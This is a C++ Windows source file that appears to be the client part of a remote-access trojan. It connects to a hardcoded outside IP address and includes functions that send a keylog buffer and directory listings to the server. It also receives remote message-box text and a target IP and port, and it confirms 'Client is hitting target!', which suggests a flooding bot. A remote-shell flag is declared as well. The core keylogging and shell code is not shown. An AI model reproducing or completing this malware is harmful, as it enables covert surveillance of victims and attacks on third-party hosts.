#include "stdafx.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <urlmon.h>
#include <WinInet.h>
#include <string.h>
#include <dirent.h>
#include <fstream>
#include <stdlib.h>
#include <string>
// Need to link with Ws2_32.lib
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Wininet.lib")

using namespace std;
u_short port = 27015;
char clientMessage[DEFAULT_BUFLEN];
SOCKET m_socket;
sockaddr_in server;
socklen_t serverLength = sizeof(server);
WSADATA wsaData;

BOOL SrvOutChk_RemShell = FALSE;
BOOL SrvOutChk_Msg = FALSE;
int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

int ServerAddrSize = sizeof(server);

char ip[255] = "98.155.64.207";
char recvdir[DEFAULT_BUFLEN] = "";
char recvdir2[DEFAULT_BUFLEN] = "";
char recvbuf[DEFAULT_BUFLEN] = "";
char srvLog[DEFAULT_BUFLEN] = "Success!";
char msgBox[DEFAULT_BUFLEN] = "";
char msgBoxTitle[DEFAULT_BUFLEN] = "";
char msgBoxLog[DEFAULT_BUFLEN] = "Success!";
char srvConf[DEFAULT_BUFLEN] = "Client is hitting target!";
char targetIp[DEFAULT_BUFLEN] = "";
char targetPort[DEFAULT_BUFLEN] = "";
char sendKeyLog[35000];
char sendDir1[DEFAULT_BUFLEN] = "";
char sendDir2[DEFAULT_BUFLEN] = "";
char sendDir3[DEFAULT_BUFLEN] = "";
char sendDir4[DEFAULT_BUFLEN] = "";
char sendDir5[DEFAULT_BUFLEN] = "";
char sendDir6[DEFAULT_BUFLEN] = "";
char sendDir7[DEFAULT_BUFLEN] = "";
char sendDir8[DEFAULT_BUFLEN] = "";

char recvFile[28000];

PCHAR hostname, servicename;
DWORD bufferSize = sizeof(hostname);
DWORD serviceBuffer = sizeof(servicename);
string tp, tp1, tp2, tp3, tp4, tp5, tp6, tp7, tp8;
BOOL c1, c2, c3, c4, c5, c6, c7, c8;

class sendMsg
{
public:

    void msgServer();
    void rcvMsg();
    void chkSrv();
    void extSrv();
    void rcvMsg2();

    void rcvMsgBoxInput();
    void rcvMsgBoxTitle();

    void sndKeyLog();

    void rcvIp();
    void rcvPort();

    void sndServSuccess();
    void sndServConfirmation();

    void rcvDir();
    void rcvDir2();
};

void sendMsg::rcvDir2()
{
    do {
        iResult = recv(m_socket, recvdir2, sizeof(recvdir2), 0);
        if (iResult > 0)
        {
            system("cls");
            break;
        }

    } while (iResult > 0);
}

void sendMsg::rcvDir()
{
    do {
        iResult = recv(m_socket, recvdir, sizeof(recvdir), 0);
        if (iResult > 0)
        {
            system("cls");
            break;
        }

    } while (iResult > 0);
}

void sendMsg::sndServSuccess()
{
    send(m_socket, msgBoxLog, sizeof(msgBoxLog), 0);
}

void sendMsg::sndServConfirmation()
{
    send(m_socket, srvConf, sizeof(srvConf), 0);
}

void sendMsg::rcvIp()
{
    do {
        iResult = recv(m_socket, targetIp, sizeof(targetIp), 0);
        if (iResult > 0)
        {
            system("cls");
            break;
        }

    } while (iResult > 0);
}

void sendMsg::rcvPort()
{
    do {
        iResult = recv(m_socket, targetPort, sizeof(targetPort), 0);
        if (iResult > 0)
        {
            system("cls");
            break;
        }

    } while (iResult > 0);
}

void sendMsg::sndKeyLog()
{
    send(m_socket, sendKeyLog, sizeof(sendKeyLog), 0);
}

void sendMsg::rcvMsg2()
{
    do {
        iResult = recv(m_socket, recvbuf, sizeof(recvbuf), 0);
        if (iResult > 0)
        {
            system("cls");
            break;
        }

    } while (iResult > 0);
}

void sendMsg::rcvMsg()
{
    cout << "Waiting for reply...\n" << endl;
    do {
        iResult = recv(m_socket, recvbuf, sizeof(recvbuf), 0);
        if (iResult > 0)
        {
            system("cls");
            cout << "Reply: " << recvbuf << "\n" << endl;
            break;
        }

    } while (iResult > 0);
}

void sendMsg::rcvMsgBoxInput()
{
    do {
        iResult = recv(m_socket, msgBox, sizeof(msgBox), 0);
        if (iResult > 0)
        {
            send(m_socket, msgBoxLog, sizeof(msgBoxLog), 0);
            break;
        }

    } while (iResult > 0);
}

void sendMsg::rcvMsgBoxTitle()
{
    do {
        iResult = recv(m_socket, msgBoxTitle, sizeof(msgBoxTitle), 0);
        if (iResult > 0)
        {
            send(m_socket, msgBoxLog, sizeof(msgBoxLog), 0);
            break;
        }

    } while (iResult > 0);
}

void sendMsg::msgServer()
{
    cout << "Write Message: ";
    cin.getline(clientMessage, sizeof(clientMessage));
    cout << "\n" << endl;
    system("cls");
    send(m_socket, clientMessage, sizeof(clientMessage), 0);
}

void sendMsg::chkSrv()
{
    if (iResult <= 0)
    {
        system("cls");
        cout << "Disconnected from server...\n" << endl;
        system("pause");
    }
}

void sendMsg::extSrv()
{
    system("cls");
    cout << "Exiting server and closing sockets";
    DOT;
    DOTSLEEP;
    DOT;
    DOTSLEEP;
    DOT;
    DOTSLEEP;
    closesocket(m_socket);
}